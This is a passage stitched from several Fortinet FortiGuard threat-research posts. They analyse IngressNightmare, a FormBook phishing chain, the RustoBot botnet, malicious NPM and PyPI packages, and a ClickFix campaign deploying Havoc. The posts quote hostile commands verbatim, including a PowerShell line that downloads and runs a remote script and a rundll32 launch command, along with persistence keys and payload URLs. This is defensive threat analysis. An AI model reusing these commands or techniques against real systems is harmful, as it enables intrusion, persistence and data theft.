accounting for over 20% of all exploits. Routers, surveillance cameras, and firewalls with outdated firmware or default credentials are being recruited into botnets, used for lateral movement, or exploited for persistent access. But what’s striking isn’t just the volume of exploitation. It’s how methodical it has become. Attackers aren’t wasting time. They map the exposed surfaces of potential victims, wait for a vulnerability to emerge, and either strike before the organization can apply a patch or sell that vulnerability information on darknet forums. Once inside, adversaries move with precision. In 88% of observed cases involving lateral movement, attackers used RDP to pivot within the network. Remote Access Trojans (RATs) such as Xeno RAT and SparkRAT provided remote command execution, data exfiltration, and long-term persistence. Living-off-the-land techniques using legitimate Windows tools and protocols have made traditional detection approaches less effective. Attackers routinely leveraged PowerShell, WMI, and SMB traffic anomalies to move laterally and escalate privileges. Active Directory manipulation (via DCSync and DCShadow) enabled attackers to harvest credentials and silently expand their access. Encrypted C2 channels, domain generation algorithms, and DNS tunneling were widely used to maintain communication with compromised systems, all while bypassing conventional perimeter defenses. The pattern is clear: Attackers are optimizing for speed, scale, and stealth. Defenders must do the same. Traditional security models that rely on static controls, point-in-time assessments, or delayed patch cycles are increasingly inadequate. What’s needed is a shift toward Continuous Threat Exposure Management (CTEM): This isn’t a technology conversation; it’s a business continuity conversation. Cyberthreats no longer wait for vulnerabilities to be exposed. Their reconnaissance efforts monitor all levels of the network, including compromised credentials and other weaknesses available on darknet forums, so they can strike before your team can respond. The global threat landscape is evolving, but the mission remains the same: reduce exposure, increase visibility, and move faster than the adversary. The Fortinet Security Fabric is designed to meet this challenge, uniting advanced threat intelligence, real-time detection, and coordinated response across the entire digital infrastructure. Executives must ensure their organizations are not only protected but positioned to adapt.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Ingress-NGINX Containers v1.11.0-4, v1.12.0, <v1.11.0Impacted Users:Any OrganizationImpact:Attackers gain control of the vulnerable systemsSeverity Level:Critical On March 24, 2025, researchers from Wiz, Inc. disclosed a critical group of vulnerabilities in the Kubernetes Ingress-NGINX controller, dubbedIngressNightmare. Among the most severe issues isCVE‑2025‑1974, which allows an attacker with only network access to the admission webhook to potentially achieve remote code execution (RCE) in the ingress controller pod. This vulnerability was privately disclosed earlier in March and publicly announced after patches became available. It has a CVSS rating of 9.8, underscoring the severity and urgency of applying the fixes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. This article summarizes how these CVEs work, explains our proof-of-concept demo of the exploit, and outlines mitigations and detection strategies. We’ll also show how Lacework FortiCNAPP and the broader Fortinet Security Fabric provide coverage for these kinds of attacks. Key Point: In many configurations, the admission webhook is reachable from within the cluster’s network (i.e., from any pod). That means a compromised pod or a foothold within the cluster can exploit these annotation injection flawswithoutneeding Kubernetes API credentials. Our testing confirmed that this exploit path requires an attacker to reach the Ingress-NGINX admission controller on the cluster network. If you can only access the cluster via kubectl port-forward or other indirect means, some temporary file uploading steps may not work reliably. Hence, in practice, this RCE exploit is often executed from a pod that already has an internal vantage point on the cluster network (for example, a malicious container running due to SSRF, a misconfigured job, or a prior partial compromise). When chained, these vulnerabilities let an attacker: We’ve created a short video demonstration that showcases how the exploit works from start to finish, which you can watch here: Network Note: Our tests confirm that port forwarding doesn’t always replicate the network conditions needed to trigger the file upload mechanism. We recommend running the exploit from a pod already in the cluster’s network if you’re assessing your own environment. Because this vulnerability chain can yield near-complete cluster compromise, remediation should be a top priority. Key recommendations include: For a more detailed look at the patch details, see: Within our test environment, we leveragedLacework FortiCNAPPcomponents to gain multi-layered visibility into the compromise: In our demo, alerts were generated when we: Beyond Lacework FortiCNAPP’s container-aware protections, the broaderFortinet Security Fabricprovides additional layers of defense: For a summary of how Fortinet addresses this specific vulnerability and the associated set of CVEs, see theFortiGuard Threat Signal Reportpublished on April 3rd, 2025. IngressNightmare(CVE‑2025‑1974 and related flaws) highlights the importance of secure ingress configurations and strict controls on admission webhooks. By exploiting an internal vantage point, attackers can pivot from a low-privileged pod into a full cluster compromise if the ingress controller is left unpatched and overly exposed. Fortunately, patching and hardening are straightforward: Continuous visibility and detection go hand in hand with strong prevention. Tools likeLacework FortiCNAPPand theFortinet Security Fabricadd significant layers of protection for both container runtime security and the cloud control plane.

    "link": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign-part-i",
    "content": "FortiGuard Labs Threat Research Fortinet’s FortiGuard Labs observed a phishing campaign in the wild that delivered a malicious Word document as an attachment. This document contained crafted data designed to exploit the vulnerabilityCVE-2017-11882. After conducting an in-depth analysis, I discovered that the campaign was spreading a new variant of Formbook. Formbook is information-stealing malware targeting Windows users. It steals sensitive data from compromised systems, including stored credentials from popular software, the victim’s keystrokes, screenshots, and system clipboard data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. I will present my research into this malware in a series of analysis blogs. This first one provides insights into how the phishing email tricks the recipient into opening the attached Word document, how it exploits the vulnerability CVE-2017-11882 with crafted equation data, how it downloads and decrypts the fileless FormBook executable, and how it ultimately executes the FormBook malware in a selected target process via process hollowing. The phishing campaign starts with an email disguised as a sales order urging the recipient to open the attached Word document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. The attached Word document, order0087.docx, is saved in OOXML (Office Open XML) format and compressed as a ZIP archive. Figure 2 reveals the relevant files and file contents inside the Word document. When the recipient opens the Word document, the “<w:altChunk>” node within document.xml is parsed, automatically loading an external file, “Algeria.rtf,” as shown in Figure 2. The RTF file (“Algeria.rtf”) is obfuscated with a large amount of junk data. After de-obfuscating the RTF file, two embedded binary objects (leading by “\\objdata” tag) can be found within it. The first binary object is a package containing a 64-bit DLL file, as shown in Figure 3. The DLL file, named “AdobeID.pdf,” is extracted to the system %temp% folder when the RTF is opened in Microsoft Word. The second binary object is in OLE format and contains crafted equation data intended for Microsoft Equation Editor 3.0. When Word parses the RTF file, this exploits the CVE-2017-11882 vulnerability. CVE-2017-11882is a known remote code execution (RCE) vulnerability in Microsoft Equation Editor (EQNEDT32.EXE). Parsing the crafted equation data in EQNEDT32.EXE causes a buffer overflow, and the return address of the vulnerable function is overwritten with 0x430C12, as seen in Figure 4. The instruction at 0x430C12 is “call  ds:WinExec(),” which is called after the buffer overflow occurs and the vulnerable function returns to this address. Figure 5 shows a screenshot of EQNEDT32.exe calling this API at 0x430C12. The command-line parameter to WinExec() API is “CmD.exe /C rundll32 %tmp%\\AdobeID.pdf,IEX  A”. This command is copied by the vulnerable function from the crafted equation data, as shown in Figure 4. As a result, the extracted 64-bit DLL file, AdobeID.pdf, is executed by rundll32.exe. Based on my analysis, the 64-bit DLL acts as a downloader and installer for Formbook. Let’s examine how it works. It adds a key into “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” with the following settings: Key name: “RtkAudUService”Key value: “C:\\Windows\\System32\\rundll32.exe C:\\Users\\win-10\\AppData\\Roaming\\Templates\\AdobeID.pdf, IEX” This ensures the malicious command-line command executes automatically at the system’s startup. Figure 6 shows the added auto-run item in the system registry. Correspondingly, it: 1> Creates a folder named “Templates” under the %appdata% folder. 2> Copies the extracted 64-bit DLL into the new folder by executing the following command-line command: “cmd.exe /c copy C:\\Users\\%username%\\AppData\\Local\\Temp\\AdobeID.pdf   C:\\Users\\%username%\\AppData\\Roaming\\Templates” The Formbook payload is disguised as a picture file (PNG) to be downloaded. The URL to the PNG file is: “hxxps://www2[.]0zz0[.]com/2025/02/02/10/709869215.png” To retrieve the payload, it uses multiple Windows API functions, including: WinHttpCrackUrl(),WinHttpOpen(),WinHttpConnect(),WinHttpOpenRequest(),WinHttpSendRequest(),WinHttpQueryOption(),WinHttpReceiveResponse(),WinHttpQueryDataAvailable()WinHttpReadData() I manually downloaded the PNG file to analyze it. Its size is 0x47000 (284KB). I then observed that its content is encrypted rather than a legitimate PNG (Figure 7). The malware then calls a function to decrypt the PNG file into the FormBook executable binary, as seen in Figure 8. The decrypted FormBook can be seen in the memory at the bottom. The decryption key is generated from a hardcoded string, “H1OX2WsqMLPKvGkQ.” To evade detection by endpoint security software, the FormBook payload executable is kept entirely in the memory. Since it does not write the decrypted Formbook to a local file to execute, this is a fileless variant of FormBook. This variant of FormBook chooses “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe” as a target process to run the decrypted FormBook via process hollowing. The full path of the target process is hardcoded in the variant, which is passed to CreateProcessInternalW() API. In Figure 9 below, we see that the process is about to call the CreateProcessInternalW() API, whose second parameter (RDX holds) is a string of the full path of the target process. The sixth parameter ([rsp+30]) represents the CreationFlag. The value for the CreationFlag is 0x808040C, which is a combination of the following flags: CREATE_SUSPENDEDDETACHED_PROCESSCREATE_UNICODE_ENVIRONMENTCREATE_NO_WINDOW This ultimately creates a suspended “ImagingDevices.exe” process. The malware employs sophisticated process injection techniques: It creates a temporary and invisible file by calling two APIs: GetTempFileNameW()NtCreateFile() It then calls NtWriteFile() to write the decrypted FormBook executable into the invisible temporary file. Next, it calls NtCreateSection() API to create a memory section object from the temporary file, whose file handle is passed to the API. It then maps the section object into the target process (ImagingDevices.exe) by calling the Windows native API NtMapViewOfSection(). It also returns the address of the mapped FormBook inside the target process. At that point, the decrypted FormBook has been copied into the target process. Next, it calls the Wow64GetThreadContext() API to retrieve the thread context (the CPU register value/state) of the suspended target process. It then modifies the value of some registers so the target process points to the mapped FormBook. The corresponding API, Wow64SetThreadContext(), is then called to apply the modified registers to the target process. Figure 11 shows the WOW64_CONTEXT data in memory. It only modifies two register values, EAX to 0x6E1550 and EBX to 0x2D0D0. Why does it only modify those two registers rather than EIP? The selective modification of only EAX and EBX becomes clear when examining the target process's suspended state. The process has been intercepted at the execution of RtlUserThreadStart(), where EAX holds the thread function address and EBX contains the parameter to be passed to this thread function. Now, the value of EAX holds the entry point of FormBook inside the target process, where FormBook’s base address is 0x6E0000. It finally calls the Windows native API, NtResumeThread(), to resume the target process, and the RtlUserThreadStart() API is invoked to run the FormBook payload in a newly created thread. In this first part of the blog series on the FormBook malware, I presented the entire process, from the phishing email to how the FormBook payload is downloaded, decrypted, and deployed in a targeted process. To start, I presented the phishing email we discovered that was designed to trick recipients into opening a fake sales order attachment. Once the attached Word document is opened on the targeted device, it extracts a 64-bit DLL file, disguised as \"AdobeID.pdf,” into the system’s temporary folder. At the same time, it exploits the CVE-2017-11882 vulnerability in Microsoft Equation Editor 3.0 to execute the extracted DLL. The DLL file is launched via rundll32.exe, establishing persistence on the victim’s system by adding an auto-run item to the system registry. Additionally, it downloads and decrypts the FormBook executable file. I then provided a detailed explanation of how the decrypted FormBook payload is deployed in a target process (C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe) through process hollowing, as well as the Windows-native APIs it calls to accomplish this task. InPart IIof this series, I will present the anti-analysis techniques used in this variant of FormBook and how FormBook leverages the Heaven’s Gate technique to prevent analysis and detection. I’ll also cover how it collects sensitive data from the compromised device, its communications with its command and control (C2) server, and the specific C&C commands it uses to control the victim’s system. Stay tuned. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for downloading the FormBook variant. The relevant URL downloading the PNG file is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts.

DrayTek Vigor2960 and Vigor300B 1.5.1.4.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High FortiGuard Labs recently discovered a new botnet propagating through TOTOLINK devices. Unlike previous malware targeting these devices, this variant is written inRust—a programming language introduced by Mozilla in 2010. Due to its Rust-based implementation, we’ve named the malware“RustoBot.” 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In January and February of 2025, FortiGuard Labs observed a significant increase in alerts related to attacking via TOTOLINK vulnerabilities. TOTOLINK vulnerabilities often stem from thecstecgi.cgifile—a CGI script responsible for processing user inputs, configuration changes, authentication, and administrative commands. These scripts have repeatedly been found to contain flaws, most notably command injection vulnerabilities that can be exploited remotely. Attackers can leverage various functions within this script to achieve remote code execution, includingsetUpgradeFW(CVE-2022-26210) andpingCheck(CVE-2022-26187). When we analyzed the payload athxxp://66[.]63[.]187[.]69/mpsl, we identified another vulnerability—CVE-2024-12987—affecting DrayTek devices, which was exploited by attackers during the same period. This vulnerability is an OS command injection located in thecgi-bin/mainfunction.cgi/apmcfguploadinterface. These exploits occurred in four countries: Japan, Taiwan, Vietnam, and Mexico. All incidents were aimed at technology industries. In this section, our analysis of “RustoBot” focuses on the x86 architecture version. Attackers distribute this malware using four different downloader scripts and employ two distinct commands—wgetandtftp—to retrieve and install “RustoBot.” According to the downloader scripts, “RustoBot” targets five different architectures:arm5,arm6,arm7,mips, andmpsl. However, we also identified an additional x86 architecture variant hosted on the same server. Most of the observed incident payloads specifically target TOTOLINK devices using thempslarchitecture, as illustrated in Figure 2. The malware can be identified from its plaintext string written in Rust. Its entry point can be found after analyzing the second layer of the “start” function. “RustoBot” retrieves the offsets of system API functions from the Global Offset Table (GOT) and invokes them to carry out specific behaviors. It encodes its configuration via the XOR encryption algorithm and uses numerous calculations to achieve obfuscation. First, “RustoBot” sets constants into registers for the following steps. It then makes use of instructions like “xor,” “shr,” and, “rol” to get the decoder key’s offset. Lastly, XOR decodes the hard-coded cipher with the key obtained from the former offset. Once the configuration value is decoded, it is used as an argument for subsequent functions defined in the decoded configuration. “RustoBot” exhibits two primary malicious behaviors: the first is resolving the C2 server’s domain, and the second is launching a DDoS attack. It first sends an initial packet to retrieve IP address data—specifically, the victim host’s public IP address—which is returned by the attacker’s server. It uses DNS-over-HTTPS (DoH) to blend malicious traffic into normal HTTPS requests, helping it hide within large volumes of legitimate web traffic. The retrieved IP address is then used as the value of the header field “S,” which we surmise stands for “Source.” “RustoBot” attempts to resolve four domains:dvrhelper[.]anondns[.]net,techsupport[.]anondns[.]net,rustbot[.]anondns[.]net, andmiraisucks[.]anondns[.]net. All of these domains resolve to the same IP address:5[.]255[.]125[.]150. The botnet subsequently establishes a connection with5[.]255[.]125[.]150and receives a set of parameters that serve as commands to trigger a DDoS attack: It can launch DDoS attacks using three different protocols:Raw IP,TCP, andUDP. IoT and network devices are often poorly defended endpoints, making them attractive targets for attackers to exploit and deliver malicious programs. Strengthening endpoint monitoring and authentication can significantly reduce the risk of exploitation and help mitigate malware campaigns.

    "title": "Malicious NPM Packages Targeting PayPal Users",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-npm-packages-targeting-paypal-users",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs’ AI-driven OSS malware detection system has recently discovered a series of malicious NPM packages designed to steal sensitive information from compromised systems. These packages are believed to have been created between March 5 and March 14 by a threat actor known astommyboy_h1andtommyboy_h2to targetPayPalusers. PayPal is a widely used platform holding sensitive financial information. Using PayPal-related names helps these malicious packages avoid detection, making it easier for attackers to steal sensitive information. By including \"PayPal\" in the name of the malicious packages, such asoauth2-paypalandbuttonfactoryserv-paypal, the attackers also create a false sense of legitimacy, tricking developers into installing them. The code collects and exfiltrates system data, such as usernames and directory paths, which can then be used to target PayPal accounts or be sold for fraudulent purposes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The code has very similar characteristics, aiming to steal sensitive information and send it to remote servers. Users would lose their private info without knowing it. The preinstall hook runs a malicious script automatically before the package is installed, bypassing user or security tool detection. The script collects system data like the current user, working directory, and hostname, which helps the attacker understand the environment for further malicious actions. This information is then encoded into hexadecimal format and obfuscated by truncating and splitting directory paths to make it harder for security measures to detect. The obfuscated data is sent to an external server controlled by the attacker, with the dynamically generated URL making it more difficult to block. The sensitive data exfiltrated may be used in further attacks. The hacker published numerous malicious packages in a short time. These attacks function by using a \"preinstall hook\" in malicious NPM packages, automatically running a script when the package is installed. This script collects system information, like the user, hostname, and directory paths, and then sends it to an attacker-controlled server. To spot a compromise, look for unusual NPM packages with names like \"paypal\" (e.g., oauth2-paypal or buttonfactoryserv-paypal). Other signs include unexpected network connections to unknown servers, so also check your network logs for any suspicious activity.

    "content": "FortiGuard Labs Threat Research Phishing remains one of the most prevalent cybersecurity threats worldwide, posing risks such as financial loss, data theft, reputational harm, and malware deployment. As phishing tactics grow more sophisticated, attackers are also expanding their targets across various platforms and services. The use of AI has further refined these techniques, making phishing attempts more deceptive and harder to detect. Attackers increasingly use personalized messages and convincing fake websites to evade traditional security measures, making detection more difficult for security teams. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Organizations must strengthen their defenses to keep pace with the rapidly evolving threat landscape. While traditional defenses like email filters and blacklists can block known threats, they are less effective against emerging and AI-driven phishing attacks. Real-time anti-phishing (RTAP) solutions help address this challenge by using AI and machine learning to identify and mitigate both large-scale phishing campaigns and highly targeted spear-phishing attacks as they occur. According to the 2024 Verizon DBIR report, the median time for a user to fall prey to a phishing email is less than 60 seconds.[1] Over the past several weeks, threat data gathered by FortiGuard Labs reveals critical insights into the nature of phishing campaigns and the primary targets. These insights provide a snapshot of how cybercriminals are evolving their tactics to reach unsuspecting users. 1. Facebook is a Consistent Target: Our recent monitoring of phishing attacks has shown Facebook to a top target for phishing emails. Its widespread use and abundant personal information associated with accounts make it appealing to cybercriminals seeking to steal login credentials or exploit user data. Many phishing websites attempt to deceive users by claiming their account has been disabled or requires verification. 2. Roblox Targeting: In mid-February, a spike in phishing attempts targeted Roblox, a popular gaming platform among younger users. Phishing emails appeared disguised as account alerts or prize notifications, prompting victims to click on malicious links or provide sensitive or personal details. 3. Broad Targeting the End of January: The final days of January saw a broad range of platforms targeted by phishing attempts. These included: oTelegram:A widely used and encrypted messaging app.oIonos:A Germany-based email, hosting, and cloud services provider.oCoinbase:A popular cryptocurrency exchange.oPayPal:A worldwide used online payment system.oLazada:An e-commerce platform operating primarily in Southeast Asia.oiTrust:A cryptocurrency platform.oVkontakte:A Russian social media platform. FortiGuard Labs provides an advanced RTAP service as part of our FortiSandbox Advanced AI Subscription Bundle. This service provides comprehensive and proactive protection against phishing emails and other cyber threats. The RTAP solution built into FortiSandbox uses a variety of techniques to identify and block phishing emails, including: RTAP from FortiGuard Labs ensures that even previously unseen and unknown phishing attempts—which may not be recognized by traditional security systems—are detected and blocked. Human error remains one of the primary reasons phishing attacks succeed, making employee awareness and education essential for defense. Training staff to recognize and report phishing attempts can significantly reduce an organization’s risk. A well-informed workforce serves as the first line of defense against today’s increasingly sophisticated phishing tactics. The 2024 Verizon DBIR highlights this challenge, revealing that 68% of all breaches involved a non-malicious human factor—either through social engineering or unintentional mistakes.[1] Fortinet’sFortiPhishandFortiSATempower organizations to strengthen their human firewall. FortiPhish provides phishing simulation and awareness training, while FortiSAT provides critical security awareness training to create a cyber-aware workforce. Implementing these proactive training tools will enhance employee awareness, bolster technical defenses, and reduce the risk of successful phishing attacks.

    "content": "FortiGuard Labs Threat Research FortiGuard Labs has analyzed malicious software packages detected from November 2024 to the present, identifying various techniques used to exploit system vulnerabilities. This analysis provides insights into the evolving threat landscape and emerging attack methods. FortiGuard Labs leverages our proprietary, AI-driven OSS malware detection system to track and examine these threats. By reviewing the tactics observed—such as low-file-count packages designed to evade detection, command overwrite techniques, and typosquatting—this report outlines key trends and their potential impact on system security. Since November 2024, Fortinet's automated threat detection platform has identified multiple malicious software packages, revealing various attack techniques used to exploit system vulnerabilities. These analyses show that attackers are employing methods such as obfuscation and install scripts to bypass traditional security measures. This report provides an overview of the identified threats and the techniques observed, reinforcing the importance of robust detection and security strategies in software environments. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs' analysis has identified a range of techniques used by attackers to compromise systems, including both well-known and less common methods: While not necessarily malicious on its own,the majority of detected malicious packages (1,082) exhibit a low file count, often containing minimal code designed to evade detection while enabling exploits such as data theft, unauthorized access, or system compromise. Common indicators include command overwrites, where attackers modify installation commands to introduce malicious code or bypass security, suspicious behavior flagged by machine learning systems due to anomalous patterns, and obfuscation techniques like base64 encoding or encryption to conceal harmful payloads. These tactics combine to create lightweight, evasive threats that are challenging to detect but capable of significant damage. While not all install scripts are malicious, threat actors often use them to silently deploy harmful code during installation, sometimes bypassing security checks.These scripts can modify the standard installation process to execute harmful actions without the user’s knowledge. For example, an install script may include HTTP POST requests for data exfiltration, suspicious API calls like https.get or https.request to communicate with external servers, and hardcoded URLs, such as Discord webhooks, for receiving stolen data. These actions suggest the script is setting up a backdoor or preparing the system for further malicious activities, highlighting the need for careful scrutiny of installation scripts to detect and mitigate potential threats. Packages lacking a repository URL raise concerns about their legitimacy and transparency, as they often lack clear provenance or accountability, which is typical of malicious software. Without a public repository, verifying the source, tracking development, or assessing potential security issues is difficult. Malicious actors may avoid repositories to evade scrutiny and prevent code inspection, reducing the chances of detection. A missing repository URL, combined with other red flags like suspicious APIs or URLs, increases the likelihood that the package is designed for exploitation, data theft, or other malicious activities. Suspicious URLs are a key indicator of potentially malicious packages, as they are often used to download additional payloads or establish communication with command-and-control (C&C) servers, giving attackers control over infected systems. These URLs may appear legitimate, disguising their harmful intent to evade detection. Common tactics include using shortened or dynamic URLs, hosting malicious content on trusted platforms, or disguising payloads as safe files. In 974 packages, such URLs are linked to the risk of data exfiltration, further malware downloads, and other malicious actions. It is crucial to scrutinize and monitor external URLs in package dependencies to prevent exploitation. While essential for software functionality, APIs can be weaponized by malicious actors to perform harmful activities. In 681 detected cases, suspicious APIs like https.get and https.request were used to exfiltrate data, enable command-and-control (C&C) communication, or obscure malicious intent. These APIs may send sensitive information to remote servers or allow remote control of compromised systems. In one example, the use of https.get and https.request in index.js suggests data exfiltration or communication with external sources, a common tactic in malware. Combined with other red flags, such as suspicious URLs, these API calls indicate the potential for malicious or compromised projects. Recently discovered malicious Python packages AffineQuant-99.6, amzn-aws-glue-ml-libs-python-6.1.5, and amzn-awsglue-6.1.4, exploit the setup.py file to silently collect system information, including the MAC address, hostname, username, and current directory, and sends this data to remote servers controlled by the attacker. The script uses system commands (getmac for Windows, ifconfig for Linux/macOS) to retrieve the MAC address, base64-encoded it, and send it to hidden URLs. A custom installation process using setuptools to override the installation routine ensures the malicious payload runs after the package is installed. This type of attack has been identified in multiple packages and highlights the risk developers face when installing packages from untrusted sources—potentially leading to stolen credentials, system data, and further attacks. To protect themselves, developers should install packages only from trusted sources, review package content before installation, use virtual environments to isolate installs, scan for vulnerabilities with security tools, and keep dependencies up to date. A malicious script (seller-admin-common_6.5.8, seller-rn-mng-lib_6.5.8. ) is designed to secretly collect sensitive information from a victim’s machine and send it to an external server via a Discord webhook. Upon execution, the script retrieves the internal IP address of the victim’s machine and fetches the external IP address by making an HTTPS request to an online API. It also gathers system details, such as the hostname, username, DNS servers, home directory, and application information. This collected data is then bundled into a JSON object and sent to the attacker’s server, where it can be accessed for further malicious purposes. The combination of internal and external IP addresses, DNS settings, and user details makes the attack highly invasive, enabling attackers to track the victim’s machine and potentially exploit the information for further attacks. Using a Discord webhook adds a layer of stealth, allowing the attacker to collect the stolen data without raising suspicion, making this type of data harvesting ideal for gathering intelligence or executing more targeted cyberattacks. A recently identified malicious JavaScript code found in the package xeno.dll_1.0.2 utilizes obfuscation techniques to disguise its true intentions. Upon installation, it logs keystrokes to capture private information such as passwords and credit card details, which are then encrypted and sent to a remote server controlled by the attacker. Additionally, the script installs a backdoor that provides remote access with elevated privileges, giving the attacker full control of the system. The backdoor also collects system-specific data, such as the operating system version, installed applications, and network configuration, and sends it to the attacker’s server for future exploitation. Disguised as a legitimate service, the attacker’s server makes the malicious activity harder to detect. This stealthy combination of keylogging and remote access allows the attacker to steal sensitive data and conduct further attacks, posing a significant threat to the victim's privacy and system integrity. The data from FortiGuard Labs’ analysis reveals a diverse array of malicious packages, showcasing the wide range of tactics used by cybercriminals. From simple low-file-count packages to complex, multi-layered attacks that involve combining files, network code, and process execution, attackers are leveraging increasingly sophisticated methods to breach systems. As cybersecurity threats evolve, it’s crucial for organizations and individuals to stay informed about the latest threats. Proactive defense measures such as regular system updates, advanced threat detection, and user education on identifying suspicious activity are essential in mitigating these growing risks.

Additionally, It is open-source and available on GitHub, making it easier for threat actors to modify it to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs recently discovered a phishing campaign that combines ClickFix and multi-stage malware to deploy a modified Havoc Demon Agent. The threat actor hides each malware stage behind a SharePoint site and uses a modified version of Havoc Demon in conjunction with the Microsoft Graph API to obscure C2 communications within trusted, well-known services. Figure 1 shows the attack chain. The attack campaign starts with a phishing email containing an HTML file as an attachment, as illustrated in Figure 2. It uses a brief explanation and an urgent tone to prompt the recipient to open the attachment immediately. The attachment, “Documents.html,” is a ClickFix attack that embeds a fake error message and instructions in HTML to deceive users into copying and pasting a malicious PowerShell command into their terminal or PowerShell, ultimately executing malicious code. Decoding the base64-encoded string shown in Figure 3 reveals a PowerShell command that downloads and executes a remote PowerShell script. powershell -w h -c \"iwr ‘hxxps://hao771[.]sharepoint.com/_layouts/15/download.aspx?share=EU7smZuKo-pDixZ26BSAaX0BVVcF5VkOc7qEvjsDSAH9OQ'|iex\" The Script file is hosted in SharePoint and controlled by the threat actor. When the script runs, it checks whether the execution environment is a sandbox by verifying the number of domain computers. It then deletes all registry entries under HKCU:\\Software\\Microsoft with names starting with \"zr_\" and adds the specified property as an infection marker, as shown in Figure 4. Next, the script verifies the existence of pythonw.exe. If it’s not found, it downloads the Python interpreter. Otherwise, it directly runs the Python script. Finally, the remote Python script is retrieved and executed in hidden windows to obscure malicious activity, as shown in Figure 5. Like the PowerShell script, the Python script is hosted on the same SharePoint. It contains debug information written in Russian and serves as a shellcode loader. We executed the script directly with the Python interpreter in the terminal. The log displays “Выделение памяти” (memory allocation), \"Запись в память” (write to memory), \"Выполнение shellcode” (execution of shellcode), and \" Завершение выполнения скрипта” (script execution completion) in sequence, indicating successful shellcode execution, as seen in Figure 6. KaynLdr is a Github Shellcode Loader designed to reflectively load an embedded DLL. It complicates analysis by using API hashing with a modified DJB2 algorithm and leverages resolved ntdll APIs for memory allocation and mapping. The instruction “call rax” executes the embedded DLL's entry point, as shown in Figure 7. Havoc is an open-source post-exploitation command and control framework used in red teaming exercises andattack campaignsto gain complete control over compromised targets. In this attack campaign, we observed that the threat actor uses Havoc in conjunction with the Microsoft Graph API to conceal C2 communication within well-known services. The modified Havoc Demon DLL still starts with DemonInit and uses the same hash algorithm as KaynLdr to retrieve the necessary APIs and initialize the configuration objects. The second function, “SharePointC2Init,” initializes files on the actors' SharePoint site using the Microsoft Graph API. It first combines the hardcoded shared secret with the necessary parameters for a POST request. It then sends the request to the /token endpoint of the Microsoft Identity Platform to obtain access tokens for Microsoft Graph APIs. Next, it utilizes the obtained token to create two files in SharePoint's default document library by making a PUT request, as shown in Figure 10. The Havoc AgentID generates the VictimID as a filename, concatenated with the suffix “pD9-tKout/pD9-tKin” to indicate their purpose. The initial packet sent to C2 is a CheckIn request containing data gathered from the DemonMetaData function. In this step, the victim's information—such as Host Name, User Name, Domain Name, IP Address, Process Details, OS Information, whether the user has an elevated account, and the configuration in the Demon DLL—is sent to the C2 server. All content is encrypted using the AES-256 algorithm in CTR mode with a randomly generated 256-bit key and a 128-bit IV. Finally, it is combined with the header, as illustrated in Figure 11, before being sent to the C2 server via the TransportSend function. The TransportSend function has been modified to communicate with the C2 by accessing two files: {VictimID}pD9-tKout and {VictimID}pD9-tKin. It updates the request to the “{VictimID}pD9-tKout” file and then retrieves the response from the C2 by using Microsoft Graph API with the GET method to access the contents of the ‘{VictimID}pD9-tKin’ file. If the response is successfully retrieved, the content of file '{VictimID}pD9-tKin' is immediately erased. Next, the content in the response is compared with the AgentID. If they match, the session.connected flag is set, and it enters the dispatcher routine to await new tasks from the attacker. In the dispatcher routine, the agent sends a 'Get Job' request and parses the response into Command ID, Request ID, and task. Although we only observed DEMON_COMMAND_NO_JOB (Command ID: 0xA) during our analysis, as shown in below, we found that the task would be decrypted and executed if a different command ID exists and is not 0xA in the program. The supported commands are the same as those in Havoc Github, as shown in Figure 14. They include gathering information about the target, file operations, command and payload execution, token manipulation, and Kerberos Attacks. In addition to staying alert for phishing emails, guided messages that encourage opening a terminal or PowerShell must be handled with extra caution to prevent inadvertently downloading and executing malicious commands. In this article, we uncovered the execution flow and the altered open-source post-exploitation framework used in this attack. Public services once again play a crucial role in the attack campaign, now further integrated with modified Havoc Demon to hide malicious communication within the Microsoft Graph API, making identification and detection even more challenging.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2025, FortiGuard Labs observed an attack that used Winos4.0, an advanced malware framework actively used in recent threat campaigns, to target companies in Taiwan. Figure 1 shows an example of the attack chain. Usually, there is a loader that is only used to load the malicious DLL file, and the Winos4.0 module is extracted from the shellcode downloaded from its C2 server. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. According  to a report released in November 2024, Winos4.0 was distributed through gaming-related applications, however, it spread via an email masquerading as from Taiwan's National Taxation Bureau in the campaign in January 2025. The sender claimed that the malicious file attached was a list of enterprises scheduled for tax inspection and asked the receiver to forward the information to their company's treasurer. The attachment also masquerades as an official document from the Ministry of Finance. It asks the victim to download the attached list of enterprises slated for tax inspection. However, the list is a ZIP file containing malicious DLL for the next attack stage. The files in the ZIP file are executed in the following sequence: 20250109.exe, ApowerREC.exe, and lastbld2Base.dll. 